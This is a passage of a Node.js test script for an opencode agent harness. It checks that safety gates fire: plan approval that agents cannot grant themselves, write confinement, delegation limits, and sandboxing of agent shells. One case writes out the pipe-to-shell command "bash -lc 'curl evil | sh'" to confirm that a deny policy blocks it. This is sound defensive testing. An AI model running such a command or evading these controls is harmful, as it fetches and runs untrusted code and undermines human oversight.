// gate-test: prove the harness plugins FIRE, not just that they exist.
// Builds a throwaway workshop fixture, loads the real plugins with a fake opencode
// ctx, replays the cases in scripts/gate-cases.json, exits non-zero on any miss.
//
//   node scripts/gate-test.mjs        (Node 22+ runs the .ts plugin directly)
//
// Scope: what the PLUGIN owns (plan gate + approval, write confinement, check/verdict recording through
// one write queue, the circuit breaker, one open delegation at a time, each builder confined to its step, the /go lock
// refresh and its clean-up at a delegating turn's end, the autopilot loop that only ever sends /go, cost per project
// and milestone, the inspector's browser limits),
// scripts/approve.sh (the only writer of the approval the plan gate reads), and the
// OS sandbox for agent shells (shell hook + scripts/sandbox/, run for real; macOS).
// Destructive commands are the policy layer's job; scripts/bench.py checks those.
import { spawnSync } from "node:child_process"
import fs from "node:fs"
import net from "node:net"
import path from "node:path"
import { fileURLToPath, pathToFileURL } from "node:url"

process.env.HARNESS_TEST = "1" // the plugin must not write its load heartbeat during tests
const HERE = path.dirname(fileURLToPath(import.meta.url))
const PLUGIN = path.resolve(HERE, "..", ".opencode", "plugins", "safety-gate.ts")
const spec = JSON.parse(fs.readFileSync(path.join(HERE, "gate-cases.json"), "utf8"))
{ // a result line names its case by id (report): one id, one case, across everything printed
  const seen = new Set(["h1", "h2", "h3", "k14", "dash1", "dash2", "loop/ap8", "ap-approve", "a6", "a15a-wrap"])
  const plain = [...spec.cases, ...spec.sandbox, ...spec.steps.ops, ...spec.browser.ops].map((c) => c.id)
  const prefixed = ["v4docs", "breaker", "parallel", "lock", "scope", "record", "loop"]
    .flatMap((s) => (Array.isArray(spec[s]) ? spec[s] : spec[s].ops).map((c) => `${s}/${c.id}`))
  for (const id of [...plain, ...prefixed]) {
    if (seen.has(id)) throw new Error(`gate-cases.json: duplicate case id ${id}`)
    seen.add(id)
  }
}

// The fixture lives in the workshop (gitignored), not in the temp dir: the sandbox lets agents
// write temp dirs, so sandbox cases there would pass for the wrong reason.
const root = fs.realpathSync.native(fs.mkdtempSync(path.resolve(HERE, "..", ".gate-test-")))
process.on("exit", () => fs.rmSync(root, { recursive: true, force: true })) // also after a crash
// a REVIEW.md records a verdict only with a line for every ## Hunt lens (spec 6)
const HUNT = "## Hunt\n" + ["logic", "edge cases", "concurrency", "resource leaks", "runtime failures"].map((l) => `- ${l}: checked it\n`).join("")
for (const rel of spec.fixture) {
  const p = path.join(root, rel)
  fs.mkdirSync(path.dirname(p), { recursive: true })
  // REVIEW.md needs a real verdict line
  let body = "x\n"
  // PLAN.md must parse (approve.sh refuses anything else): one valid step
  if (rel.endsWith("/PLAN.md")) body = "## SCOPE\nIN: x\n## STEPS\n### 1. hello\n- files: hello.txt\n- done when: `true`\n## ACCEPTANCE\nit runs\n"
  if (rel.endsWith("REVIEW.md")) body = "## VERDICT: SHIP\n" + HUNT
  fs.writeFileSync(p, body)
}

// scripts the sandbox cases execute (home/bin/git-credential-*): exit 0, so only the sandbox can make them fail
for (const rel of spec.executables ?? []) {
  const p = path.join(root, rel)
  fs.mkdirSync(path.dirname(p), { recursive: true })
  fs.writeFileSync(p, "#!/bin/sh\nexit 0\n", { mode: 0o755 })
}
// real git repos for the .git sandbox cases (one per case that would break the repo if the sandbox let it through):
// one commit, then an uncommitted change (so status/diff have output).
// The fixture HOME's .gitconfig must parse, or every git call there fails for the wrong reason.
fs.writeFileSync(path.join(root, "home", ".gitconfig"), "[user]\n\tname = gate-test\n\temail = gate-test@example.invalid\n")
for (const rel of spec.git_repos ?? []) {
  const d = path.join(root, rel), env = { ...process.env, HOME: path.join(root, "home") }
  fs.mkdirSync(d, { recursive: true })
  fs.writeFileSync(path.join(d, "a.txt"), "one\n")
  for (const args of [["init", "-q"], ["add", "a.txt"], ["commit", "-qm", "init"]]) {
    const r = spawnSync("git", args, { cwd: d, env, encoding: "utf8" })
    if (r.status !== 0) throw new Error(`git ${args[0]} failed in ${rel}: ${r.stderr}`)
  }
  fs.appendFileSync(path.join(d, "a.txt"), "two\n")
}
// listening unix sockets for the sandbox cases: SOCK_AGENT is named like the launchd ssh-agent socket
// (/private/tmp/com.apple.launchd.<x>/Listeners), SOCK_OTHER is not. connect() succeeds on a listening socket
// even while spawnSync blocks this process, so a refused connect can only be the sandbox.
const sockDirs = [fs.mkdtempSync("/private/tmp/com.apple.launchd."), fs.mkdtempSync("/private/tmp/gate-test-sock-")]
const SOCK_AGENT = path.join(sockDirs[0], "Listeners"), SOCK_OTHER = path.join(sockDirs[1], "s")
const sockServers = [SOCK_AGENT, SOCK_OTHER].map((p) => net.createServer().listen(p))
process.on("exit", () => { for (const d of sockDirs) fs.rmSync(d, { recursive: true, force: true }) })

// approve.sh resolves the workshop from its own location, so a copy in the fixture approves fixture projects.
const APPROVE = path.join(root, "scripts", "approve.sh")
fs.mkdirSync(path.dirname(APPROVE), { recursive: true })
fs.copyFileSync(path.resolve(HERE, "approve.sh"), APPROVE)
for (const f of ["harness_state.py", "harness_docs.py", "checkpoint.py"]) fs.copyFileSync(path.resolve(HERE, f), path.join(path.dirname(APPROVE), f)) // approve.sh execs harness_state.py from its own dir; it imports harness_docs.py (and checkpoint.py for the approval's save point)
const human = { ...process.env }
delete human.AGENT
delete human.OPENCODE_SESSION_ID
const approve = (slug, env = human) => spawnSync("bash", [APPROVE, slug], { env, encoding: "utf8" })
// /approve is the v4 approval now: BRIEF + ARCHITECTURE + PLAN (milestone M1, step 1 proves R1) and a critique round
// for M1 whose serious point is answered, with the brief locked (the lock is a library call, no CLI verb: ruling P9).
const V4_BRIEF = "# BRIEF - fixture\n## SUMMARY\nA fixture.\n## WHERE IT RUNS\n- ui: no\n## FEATURES\n- F1 [MUST] it runs\n## OPEN QUESTIONS\n- none\n"
const V4_ARCH = "# ARCHITECTURE - fixture\n## SUMMARY\nA fixture.\n## RISKS\n- R1: it may not run - test: run it once\n" +
  "## DECISIONS\n- D1: plain files - rejected: a database - why: nothing to store\n## MILESTONES\n- M1: it runs - covers: F1\n" +
  "## DEPLOY\n- kind: none\n## CRITIQUE ANSWERS\n- C1: fixed - see D1\n"
const V4_CRITIQUE = "# CRITIQUE - fixture\n## SUMMARY\nOne point.\n## ROUND 1 - M1\n- C1 [serious] [architecture] the strongest case against - fix: see D1\n"
const v4Plan = (steps) => "# PLAN - fixture\n## SUMMARY\nOne milestone.\n## MILESTONE\nM1: it runs\n## SCOPE\nIN: x\n## STEPS\n" +
  steps.map(([title, files, check], i) => `### ${i + 1}. ${title}\n- files: ${files}\n- covers: ${i === 0 ? "F1" : "none"}\n` +
    `${i === 0 ? "- proves: R1\n" : ""}- done when: \`${check}\`\n`).join("") + "## ACCEPTANCE\nit runs\n"
function v4Project(dir, steps) {
  for (const [name, body] of [["BRIEF.md", V4_BRIEF], ["ARCHITECTURE.md", V4_ARCH], ["CRITIQUE.md", V4_CRITIQUE], ["PLAN.md", v4Plan(steps)]]) {
    fs.writeFileSync(path.join(dir, name), body)
  }
  const lock = spawnSync("python3", ["-c", "import sys; sys.dont_write_bytecode=True; sys.path.insert(0, sys.argv[1]); " +
    "import harness_state as hs; ok, msg = hs.lock_brief(sys.argv[2], 't'); sys.exit(0 if ok else msg)",
    path.dirname(APPROVE), dir], { encoding: "utf8" })
  if (lock.status !== 0) throw new Error(`lock_brief failed for ${dir}: ${lock.stderr}`)
}
for (const proj of spec.approve) {
  v4Project(path.join(root, proj), [["hello", "hello.txt", "true"]])
  const r = approve(path.basename(proj))
  if (r.status !== 0) throw new Error(`approve.sh failed for ${proj}: ${r.stdout} ${r.stderr}`)
}
// step-recording projects: a 2-step plan (check 1 exits 0, check 2 exits 1), approved, with one code file;
// stepr also has a REVIEW.md that says SHIP
const STEP_STEPS = [["pass", "src/a.js", 'node -e "process.exit(0)"'], ["fail", "src/a.js", 'node -e "process.exit(1)"']]
for (const slug of spec.steps.projects) {
  const dir = path.join(root, "mini-projects", slug)
  fs.mkdirSync(path.join(dir, "src"), { recursive: true })
  v4Project(dir, STEP_STEPS)
  fs.writeFileSync(path.join(dir, "src", "a.js"), "one\n")
  if (slug === "stepr") fs.writeFileSync(path.join(dir, "REVIEW.md"), "## VERDICT: SHIP\n" + HUNT)
  const r = approve(slug)
  if (r.status !== 0) throw new Error(`approve.sh failed for ${slug}: ${r.stdout} ${r.stderr}`)
  // the critique was needed to approve; the approval hash does not cover it, and case c3 (a write to critique.md is an
  // alias of CRITIQUE.md) means something only while no CRITIQUE.md exists in stepa
  fs.rmSync(path.join(dir, "CRITIQUE.md"))
}
for (const proj of spec.edit_after_approve) fs.appendFileSync(path.join(root, proj, "PLAN.md"), "step added later\n")
// symlinks an agent shell could make inside its project (the write tools follow them)
for (const l of spec.symlinks) fs.symlinkSync(l.to, path.join(root, l.link))
// the workshop spelled with one ancestor in the other case (on this Mac: .../Projects/opencode and .../projects/opencode)
const ROOT_CASE = (() => {
  const parts = root.split(path.sep), id = fs.statSync(root)
  for (let i = parts.length - 2; i > 0; i--) {
    const flip = [...parts[i]].map((ch) => (ch === ch.toUpperCase() ? ch.toLowerCase() : ch.toUpperCase())).join("")
    if (flip === parts[i]) continue
    const v = [...parts.slice(0, i), flip, ...parts.slice(i + 1)].join(path.sep)
    try {
      const st = fs.statSync(v)
      if (st.ino === id.ino && st.dev === id.dev) return v
    } catch {}
  }
  console.log("note: case-sensitive file system, $ROOT_CASE = $ROOT")
  return root
})()

let fail = 0
const report = (id, ok, expect, got, note) => {
  if (!ok) fail++
  console.log(`${ok ? "PASS" : "FAIL"} ${id.padEnd(5)} expect=${expect.padEnd(5)} got=${got.padEnd(5)} ${note}`)
}

// the script itself: refuses agent shells (opencode sets AGENT=1 + OPENCODE_SESSION_ID there) and missing plans
const stateOf = (slug) => path.join(root, "mini-projects", slug, ".harness", "state.json")
const scriptCases = [
  ["h1", approve("unapproved", { ...human, AGENT: "1" }), "unapproved", "approve.sh refuses an agent shell (AGENT=1)"],
  ["h2", approve("unapproved", { ...human, OPENCODE_SESSION_ID: "ses_x" }), "unapproved", "approve.sh refuses an agent shell (session id)"],
  ["h3", approve("bare"), "bare", "approve.sh refuses a project without PLAN.md"],
]
for (const [id, r, slug, note] of scriptCases) {
  const got = r.status !== 0 && !fs.existsSync(stateOf(slug)) ? "block" : "allow"
  report(id, got === "block", "block", got, note)
}

// ap-approve / a6 / a15a-wrap: static checks against the REAL opencode.json policies, using opencode's own
// wildcard algorithm verbatim (core/src/util/wildcard.ts in the 2.2.5 source: escape regex metachars, "*" -> ".*",
// "?" -> ".", and a pattern ending " .*" also matches with nothing after the space). Every check reads the live
// policy list and runs the real match -- none of them can pass on a hardcoded truth value, so removing the policy
// they name makes them fail (mutation-tested; see the A15a/A15f commit messages).
const wildcardMatch = (input, pattern) => {
  let escaped = pattern.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*").replace(/\?/g, ".")
  if (escaped.endsWith(" .*")) escaped = escaped.slice(0, -3) + "( .*)?"
  return new RegExp("^" + escaped + "$", "s").test(input)
}
{
  const realCfg = JSON.parse(fs.readFileSync(path.resolve(HERE, "..", ".opencode", "opencode.json"), "utf8"))
  const denyResources = (realCfg.policies ?? [])
    .filter((p) => p.effect === "deny" && p.action === "tool.use")
    .map((p) => p.resource)
  // true only if some live deny policy's pattern matches `shell:<cmd>` under opencode's own wildcard rules
  const shellBlocked = (cmd) => denyResources.some((pattern) => wildcardMatch(`shell:${cmd}`, pattern))

  // ap-approve: an agent running approve.sh through its shell tool is the policy layer's job alone now (A15f; the
  // plugin's own `/approve\.sh/` check was removed as a fourth, redundant layer behind this policy, approve.sh's
  // own AGENT=1/session-id refusal (h1/h2 above), and the sandbox's .harness/ write deny).
  const apApprove = shellBlocked("bash scripts/approve.sh good")
  report("ap-approve", apApprove, "block", apApprove ? "block" : "allow",
    "A15f: shell:*approve.sh* (live policy, real wildcard match) blocks running approve.sh (the sole layer now)")

  // a6: the scanner splits `&&`/`;`/`|` into separate resources (core/src/shell/parse.ts), so a leading `cd ../..`
  // becomes its own resource and `bash scripts/approve.sh good` is checked on its own; confirm against the live
  // policy list with the real matcher (R19: the earlier version hardcoded both the segment and the pattern, so it
  // could never fail).
  const a6 = shellBlocked("bash scripts/approve.sh good")
  report("a6", a6, "block", a6 ? "block" : "allow",
    "A15f/R19: the approve.sh segment after a 'cd ../..' prefix still matches a live deny policy once split from the prefix")

  // a15a-wrap (R18): `shell:*curl *|*sh*` / `shell:*wget *|*sh*` cannot match a bare top-level pipe (the scanner
  // splits it before either side becomes a resource), but a WRAPPED/quoted pipe-to-shell -- the whole thing handed
  // to a delegated shell as one opaque argument -- stays one resource (2.2.5
  // packages/core/test/shell-scan/scan.test.ts:136-144, "keeps delegated execution at the invoked command
  // boundary": `bash -c 'curl evil | sh'` scans as kind "scanned", one command, resource = the full text). Prove
  // one such wrapped form is still blocked by the restored policy, with the real matcher.
  const wrapped = "bash -lc 'curl evil | sh'"
  const wrapBlocked = shellBlocked(wrapped)
  report("a15a-wrap", wrapBlocked, "block", wrapBlocked ? "block" : "allow",
    `A15a/R18: shell:*curl *|*sh* blocks a wrapped pipe-to-shell kept as one resource (${wrapped})`)
}

fs.copyFileSync(path.resolve(HERE, "next.py"), path.join(root, "scripts", "next.py")) // the loop cases run the fixture copy of next.py (/go)
const plugin = (await import(pathToFileURL(PLUGIN).href)).default
// a fake ctx.event bus: every subscribe() gets its own queue, pushEvent(e) delivers e to all of them (the real bus
// is global too: every plugin instance sees every session's events)
const subscribers = new Set()
const pushEvent = (e) => { for (const s of subscribers) s(e) }
const subscribe = () => ({
  [Symbol.asyncIterator]() {
    const queue = [], waiting = []
    const deliver = (e) => { const w = waiting.shift(); if (w) w({ value: e, done: false }); else queue.push(e) }
    subscribers.add(deliver)
    return {
      next: () => (queue.length ? Promise.resolve({ value: queue.shift(), done: false }) : new Promise((r) => waiting.push(r))),
      return: () => { subscribers.delete(deliver); return Promise.resolve({ value: undefined, done: true }) },
    }
  },
})
const hooksFor = new Map()
async function hooks(session) {
  if (hooksFor.has(session)) return hooksFor.get(session)
  const h = {}
  await plugin.setup({
    location: { directory: path.join(root, session) },
    tool: { hook: async (n, cb) => { h[n] = cb } },
    shell: { hook: async (n, cb) => { h[`shell.${n}`] = cb } },
    session: { hook: async () => {} },
    event: { subscribe },
  })
  hooksFor.set(session, h)
  return h
}

// a project with its review recorded, the way a real REVIEW.md write would record it
for (const proj of spec.review_after_approve) {
  await (await hooks(proj))["execute.after"]?.({
    tool: "write", input: { path: path.join(root, proj, "REVIEW.md") }, status: "completed", result: {},
    agent: "reviewer", sessionID: "s", id: "t", messageID: "m",
  })
}

for (const c of [...spec.cases, ...spec.v4docs.map((v) => ({ ...v, id: `v4docs/${v.id}` }))]) {
  const h = await hooks(c.session)
  // v4docs cases may change the project first: append to a file, or set keys in its state.json
  if (c.append) fs.appendFileSync(path.join(root, c.append.file), c.append.text)
  if (c.state) {
    const f = path.join(root, c.state.project, ".harness", "state.json")
    fs.writeFileSync(f, JSON.stringify({ ...JSON.parse(fs.readFileSync(f, "utf8")), ...c.state.set }))
  }
  const input = JSON.parse(JSON.stringify(c.input).replaceAll("$ROOT_CASE", ROOT_CASE).replaceAll("$ROOT", root))
  let got = "allow", msg = ""
  const realHome = process.env.HOME
  if (c.home) process.env.HOME = path.join(root, "home") // the plugin reads HOME per call: agent.sb's HOME rules on the fixture
  try {
    // these gates hold for every agent; the builder/qa/designer write scopes have their own section below
    await h["execute.before"]({ tool: c.tool, input, agent: c.agent ?? "any", sessionID: "s", id: "t", messageID: "m" })
  } catch (e) {
    got = "block"
    msg = String(e?.message)
  } finally {
    process.env.HOME = realHome
  }
  // message_has pins WHICH gate refused (a block for the wrong reason is a failure)
  const why = c.message_has && got === "block" && !msg.includes(c.message_has)
  report(c.id, got === c.expect && !why, c.expect, got, `${c.note}${why ? " :: wrong reason: " + msg.slice(0, 80) : ""}`)
}

// delegations (spec 7.2 rules 7-8, rulings R8/P7/P8): replay delegation-tool calls and turn events through the
// workshop-root plugin instance. Session ids carry the section name, so no section sees another's counts.
// An op runs, in order: write_locks, fill (calls that must all pass), full (the session must now be at the cap),
// open (a call with no execute.after yet), close (its execute.after), events, then the checked calls / lock files.
// A call or open may carry extra input ([session, agent, n, {background: true}]); a close may carry its error text.
// "instance": "flaky" runs the op on a plugin instance whose first ctx.event.subscribe() throws (the loop must subscribe again).
let callNo = 0
const flaky = {}
{
  let tries = 0
  await plugin.setup({
    location: { directory: root },
    tool: { hook: async (n, cb) => { flaky[n] = cb } },
    shell: { hook: async (n, cb) => { flaky[`shell.${n}`] = cb } },
    session: { hook: async () => {} },
    event: { subscribe: () => { if (tries++ === 0) throw new Error("no stream yet"); return subscribe() } },
  })
}
for (const section of ["breaker", "parallel", "lock", "fallback"]) {
  let h = await hooks("")
  const rootHooks = h
  const ev = (s, agent, extra = {}) => ({
    // the lock section's delegations name their project, as the orchestrator's do: a turn end frees only its own lock (U10)
    tool: "subagent", input: { agent, description: section === "lock" ? "lockp: x" : "x", prompt: "x", ...extra }, agent: "orchestrator",
    sessionID: `${section}:${s}`, id: `call_${++callNo}`, messageID: "m",
  })
  const before = async (e) => {
    try { await h["execute.before"](e); return "" } catch (err) { return String(err?.message ?? err) || "refused" }
  }
  // "running": the host moved the call to the background (L124); its child is `<session>-child`
  const bgOut = (e) => ({ sessionID: `${e.sessionID}-child`, status: "running", output: "" })
  const after = (e, status = "completed", why = "x") =>
    h["execute.after"]?.(status === "error" ? { ...e, status, error: new Error(why) }
      : status === "running" ? { ...e, status: "completed", result: { output: bgOut(e), metadata: bgOut(e) } }
      : { ...e, status, result: { output: "ok" } })
  const open = new Map()
  for (const op of spec[section]) {
    const problems = []
    h = op.instance === "flaky" ? flaky : rootHooks
    if (op.write_locks) for (const f of spec.lock_files) fs.writeFileSync(path.join(root, f), JSON.stringify({ stage: "PLAN", at: "t" }))
    for (const [s, agent, n] of op.fill ?? []) {
      for (let i = 0; i < n; i++) {
        const e = ev(s, agent), msg = await before(e)
        if (msg) { problems.push(`fill refused: ${msg.slice(0, 60)}`); break }
        await after(e)
      }
    }
    if (op.full && !(await before(ev(op.full, "probe"))).includes("circuit breaker")) problems.push(`${op.full} is not at the cap`)
    for (const [s, agent, extra] of op.open ?? []) {
      const e = ev(s, agent, extra), msg = await before(e)
      if (msg) problems.push(`open refused: ${msg.slice(0, 60)}`)
      open.set(`${s}/${agent}`, e)
    }
    for (const [s, agent, status, why] of op.close ?? []) await after(open.get(`${s}/${agent}`), status, why)
    for (const [type, s] of op.events ?? []) pushEvent({ id: `evt_${++callNo}`, type, created: Date.now(), data: { sessionID: `${section}:${s}` } })
    if (op.events) await new Promise((r) => setTimeout(r, 20)) // the plugin's event loop runs between ticks
    let got = "allow", msg = ""
    for (const [s, agent, n, extra] of op.calls ?? []) {
      for (let i = 0; i < n && got === "allow"; i++) {
        const e = ev(s, agent, extra)
        msg = await before(e)
        if (msg) got = "block"
        else await after(e)
      }
    }
    if (op.calls && got !== op.expect) problems.push(`got ${got}${msg ? ": " + msg.slice(0, 80) : ""}`)
    else if (op.calls && op.message_has && !msg.includes(op.message_has)) problems.push(`wrong reason: ${msg.slice(0, 120)}`)
    for (const f of op.lock ? spec.lock_files : []) {
      if (fs.existsSync(path.join(root, f)) !== (op.lock === "present")) problems.push(`${f} ${op.lock === "present" ? "is gone" : "is still there"}`)
    }
    for (const f of op.kept ?? []) if (!fs.existsSync(path.join(root, f))) problems.push(`${f} was deleted`)
    const exp = op.expect ?? op.lock
    report(`${section}/${op.id}`, problems.length === 0, exp, problems.length ? "wrong" : exp, `${op.note}${problems.length ? " :: " + problems.join("; ") : ""}`)
  }
}
// sandbox: run each command the way opencode would after the shell hook (AGENT=1 marks agent shells)
for (const c of spec.sandbox) {
  const h = await hooks(c.session)
  const env = { ...human, HOME: path.join(root, "home") + (c.home ?? ""), HARNESS_TEST_TOKEN: "x", HARNESS_TEST_PASS: "x", HARNESS_TEST_AUTH: "x", harness_test_password: "x", "npm_config_//registry.example/:_authToken": "x", "gate-odd.name": "1" }
  for (const [k, v] of Object.entries(c.env ?? {})) env[k] = String(v).replaceAll("$ROOT", root) // per-case (XDG dirs)
  const command = c.command.replaceAll("$SOCK_AGENT", SOCK_AGENT).replaceAll("$SOCK_OTHER", SOCK_OTHER)
  const inv = { command, cwd: c.cwd ?? path.join(root, c.session), timeout: 0, shell: c.shell ?? "/bin/zsh", env } // bash, unlike zsh, hands odd-named variables on
  if (!h["shell.create.before"]) {
    report(c.id, false, c.expect, "nohook", c.note)
    continue
  }
  await h["shell.create.before"](inv)
  if (c.agent) inv.env.AGENT = "1"
  const r = spawnSync(inv.shell, ["-c", inv.command], {
    cwd: path.resolve(root, c.session, c.cwd ?? ""), env: inv.env, encoding: "utf8",
  })
  const got = r.status === 0 ? "allow" : "block"
  report(c.id, got === c.expect, c.expect, got, c.note)
}

// steps: replay tool calls through execute.before/after and read the recorded state back
const stepState = (slug) => {
  try { return fs.readFileSync(stateOf(slug), "utf8") } catch { return "" }
}
const treeOf = (slug) => spawnSync("python3", [path.join(HERE, "harness_state.py"), "tree", path.join(root, "mini-projects", slug)], { encoding: "utf8" }).stdout.trim()
const lines = (a, b) => Array.from({ length: b - a + 1 }, (_, i) => `line ${a + i}`).join("\n")
for (const op of spec.steps.ops) {
  const h = await hooks(op.session)
  const slug = op.expect.project ?? path.basename(op.session)
  const before = Object.fromEntries(spec.steps.projects.map((p) => [p, stepState(p)]))
  if (op.file) fs.writeFileSync(path.join(root, op.file.path), op.file.body)
  const input = JSON.parse(JSON.stringify(op.input).replaceAll("$ROOT", root))
  const ev = { tool: op.tool, input, agent: "builder", sessionID: "s", id: "t", messageID: "m" }
  const problems = []
  { // every step op is an execute.after (the ship gate's execute.before ops went with it, Task 10)
    const r = op.result ?? {}
    const output = { ...r }
    if (r.lines) { output.output = lines(1, r.lines) + "\n"; delete output.lines }
    ev.status = op.status ?? "completed"
    if (ev.status === "error") ev.error = new Error(op.error)
    else ev.result = { output, metadata: r.exit === undefined ? {} : { exit: r.exit } }
    await h["execute.after"]?.(ev)
    let st = {}
    try { st = JSON.parse(stepState(slug)) } catch {}
    const e = op.expect
    if (e.steps && JSON.stringify(st.steps?.map((s) => [Boolean(s.done_at), s.attempts])) !== JSON.stringify(e.steps)) {
      problems.push(`steps ${JSON.stringify(st.steps?.map((s) => [Boolean(s.done_at), s.attempts]))}`)
    }
    if (e.last_failure) {
      const lf = st.steps?.[e.last_failure.step]?.last_failure
      if (e.last_failure.contains ? !String(lf).includes(e.last_failure.contains) : lf !== (e.last_failure.prefix ?? "") + lines(e.last_failure.from, e.last_failure.to)) {
        problems.push(`last_failure ${JSON.stringify(lf)?.slice(0, 60)}`)
      }
    }
    if (e.review === "none" ? st.review !== undefined : e.review && (st.review?.verdict !== e.review || st.review?.tree_sha256 !== treeOf(slug) || !st.review?.at)) {
      problems.push(`review ${JSON.stringify(st.review)}`)
    }
  }
  for (const p of op.expect.unchanged ?? []) if (stepState(p) !== before[p]) problems.push(`${p} changed`)
  report(op.id, problems.length === 0, "ok", problems.length ? "wrong" : "ok", `${op.note}${problems.length ? " :: " + problems.join("; ") : ""}`)
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
const created = (sid, parent, title, agent) =>
  pushEvent({ id: `evt_${++callNo}`, type: "session.created", created: Date.now(), data: { sessionID: sid, parentID: parent, title, agent } })
/** One op of execute.before calls: each call's allow/block (and message_has) against what it expects. */
async function beforeCalls(label, h, sid, op) {
  const problems = []
  for (const c of op.calls) {
    const input = JSON.parse(JSON.stringify(c.input).replaceAll("$ROOT", root))
    let got = "allow", msg = ""
    try {
      await h["execute.before"]({ tool: c.tool, input, agent: c.agent, sessionID: sid(c.sid), id: `call_${++callNo}`, messageID: "m" })
    } catch (e) {
      got = "block"
      msg = String(e?.message)
    }
    const what = `${c.agent} ${c.input.path ?? c.input.command ?? c.input.url ?? c.input.filename ?? "(no filename)"}`.replace("$ROOT/", "")
    if (got !== c.expect) problems.push(`${what}: ${got}${msg ? " (" + msg.slice(0, 90) + ")" : ""}`)
    else if (c.message_has && !msg.includes(c.message_has)) problems.push(`${what}: wrong reason: ${msg.slice(0, 120)}`)
  }
  report(label, problems.length === 0, "ok", problems.length ? "wrong" : "ok", `${op.note}${problems.length ? " :: " + problems.join("; ") : ""}`)
}

// step scope (Review Focus 3, 4): a builder child is tied to its step by its session title (= the delegation's
// description, CHILD_TIE "title"), from session.created or, when that event was missed, ctx.session.get
{
  const S = spec.scope, dir = path.join(root, "mini-projects", S.project)
  fs.mkdirSync(dir, { recursive: true })
  v4Project(dir, S.steps)
  const r = approve(S.project)
  if (r.status !== 0) throw new Error(`approve.sh failed for ${S.project}: ${r.stdout} ${r.stderr}`)
  const sid = (s) => `scope:${s}`
  const rootH = await hooks("")
  const getH = {} // an instance that only knows the child bg3 through ctx.session.get (as after a restart)
  await plugin.setup({
    location: { directory: root },
    tool: { hook: async (n, cb) => { getH[n] = cb } },
    shell: { hook: async () => {} },
    session: {
      hook: async () => {},
      get: async ({ sessionID }) => (sessionID === sid("bg3") ? { id: sessionID, title: `${S.project}: step 3`, parentID: sid("sroot") } : undefined),
    },
    event: { subscribe },
  })
  for (const [c, p, title, agent] of S.created) created(sid(c), sid(p), title, agent)
  await sleep(20)
  const snap = path.join(dir, ".harness", "snapshot.json")
  for (const op of S.ops) {
    if (op.snapshot) fs.writeFileSync(snap, JSON.stringify({ files: {}, at: "t", ...op.snapshot }))
    else if ("snapshot" in op) fs.rmSync(snap, { force: true })
    await beforeCalls(`scope/${op.id}`, op.instance === "get" ? getH : rootH, sid, op)
  }
}

// the inspector's browser (spec 9.3 fact 6, ruling C5+): navigation only to its project's preview port, screenshot files
// only in its project's design/shots/ (a relative name is the WORKSHOP's, the MCP's cwd); no other agent saves a file
{
  const B = spec.browser, dir = path.join(root, "mini-projects", B.project), sid = (s) => `br:${s}`
  fs.mkdirSync(path.join(dir, ".harness"), { recursive: true })
  fs.mkdirSync(path.join(dir, "design", "shots"), { recursive: true })
  fs.writeFileSync(path.join(dir, ".harness", "state.json"), JSON.stringify({ port: B.port }))
  for (const [link, to] of B.symlinks) fs.symlinkSync(to.replace("$ROOT", root), path.join(dir, link))
  for (const [c, p, title, agent] of B.created) created(sid(c), sid(p), title, agent)
  await sleep(20)
  for (const op of B.ops) await beforeCalls(op.id, await hooks(""), sid, op)
}

// cost and the autopilot loop (spec 3.2, 9.3 facts 1, 7, 8; Review Focus 2, 3): turn events and delegations through
// instances whose ctx.session records every command() call. "instance": "fresh" is a restarted plugin (empty maps).
{
  const L = spec.loop, sid = (s) => `loop:${s}`, sent = []
  // ctx.session.get answers only in the CURRENT instance (a restarted plugin replaces the old one; the old instance
  // stays subscribed here, which the host would not do): the loop's sessions live in the workshop directory
  let current = null
  const instance = async () => {
    const h = {}, me = {}
    current = me
    await plugin.setup({
      location: { directory: root },
      tool: { hook: async (n, cb) => { h[n] = cb } },
      shell: { hook: async () => {} },
      session: {
        hook: async () => {},
        command: async (args) => { sent.push(args) },
        get: async ({ sessionID }) => (current === me && sessionID.startsWith("loop:") ? { id: sessionID, location: { directory: root } } : undefined),
      },
      event: { subscribe },
    })
    return h
  }
  for (const slug of L.projects) {
    const dir = path.join(root, "mini-projects", slug)
    fs.mkdirSync(dir, { recursive: true })
    v4Project(dir, [["hello", "hello.txt", "true"]]) // M1 is the current milestone
  }
  const ALIVE = path.join(root, ".harness", "plugins-alive")
  const lockOf = (slug) => path.join(root, "mini-projects", slug, ".harness", "lock")
  const at = (doc, p) => p.split(".").reduce((o, k) => (o == null ? undefined : o[k]), doc)
  let h = await instance()
  for (const op of L.ops) {
    if (op.instance === "fresh") h = await instance()
    for (const [rel, body] of Object.entries(op.files ?? {})) fs.writeFileSync(path.join(root, rel), body)
    for (const [slug, set] of Object.entries(op.set ?? {})) {
      const f = path.join(root, "mini-projects", slug, ".harness", "state.json")
      fs.writeFileSync(f, JSON.stringify({ ...JSON.parse(fs.readFileSync(f, "utf8")), ...set }))
    }
    // next.py's lock: {stage, at} in whole seconds, written by the /go template just before its turn starts
    const lockAt = (slug) => new Date(Date.now() - 1000 * (op.lock_age_s?.[slug] ?? 0)).toISOString().replace(/\.\d+Z$/, "Z")
    for (const slug of op.locks ?? []) fs.writeFileSync(lockOf(slug), JSON.stringify({ stage: "BUILD", at: lockAt(slug) }))
    fs.rmSync(ALIVE, { force: true })
    sent.length = 0
    const problems = []
    const ev = (type, s, data = {}) => pushEvent({ id: `evt_${++callNo}`, type, created: Date.now(), data: { sessionID: sid(s), ...data } })
    for (const [kind, s, a, title] of op.seq) {
      if (kind === "created") ev("session.created", s, { parentID: a ? sid(a) : undefined, title })
      else if (kind === "start") ev("session.execution.started", s)
      else if (kind === "end") ev(`session.execution.${a}`, s)
      else if (kind === "usage") ev("session.usage.updated", s, { cost: a })
      else if (kind === "wait") await sleep(s)
      else if (kind === "tool") { // a read by a worker child: refreshes its project's lock
        await h["execute.before"]({ tool: "read", input: { filePath: path.join(root, "mini-projects", "apa", "PLAN.md") }, agent: "builder", sessionID: sid(s), id: `call_${++callNo}`, messageID: "m" })
      }
      else if (kind === "check_sent") {
        await sleep(300)
        if (sent.length !== s) problems.push(`${sent.length} command() calls while a slot still runs`)
      } else { // delegate | delegate_bg | open | delegate_fail: one subagent call from the root, completed (or moved to
        // the background, or still running: no execute.after, or failed: the worker's provider blocked it, run B)
        const e = { tool: "subagent", input: { agent: "builder", description: a, prompt: "x" }, agent: "orchestrator", sessionID: sid(s), id: `call_${++callNo}`, messageID: "m" }
        await h["execute.before"](e)
        if (kind === "open") continue
        if (kind === "delegate_fail") {
